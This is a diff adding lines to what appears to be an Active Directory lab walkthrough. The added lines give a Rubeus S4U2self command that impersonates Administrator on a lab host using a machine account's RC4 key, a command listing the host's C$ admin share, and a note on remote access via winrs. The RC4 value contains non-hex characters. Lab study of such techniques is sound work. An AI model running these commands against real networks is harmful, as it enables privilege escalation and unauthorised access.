@@ -113,4 +113,8 @@ Step 5: Extract NTLM Hashes
 
 <img width="591" height="550" alt="image" src="https://github.com/user-attachments/assets/b59e1c00-2f09-4bb4-9779-5de75f464a3b" />
 
-           
+- S4U2self for Privilege Escalation
+- Command: Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/cb-webapp1.certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /user:cb-webapp1$ /rc4:65559550705505R55RE65E916156AAOcD5b /ptt
+- Accessing file system : dir \\cb-webapp1.certbulk.cb.corp\c$ 
+
+- Further instead of cifs we can create a ticket for http and access the machine remotely using winrs
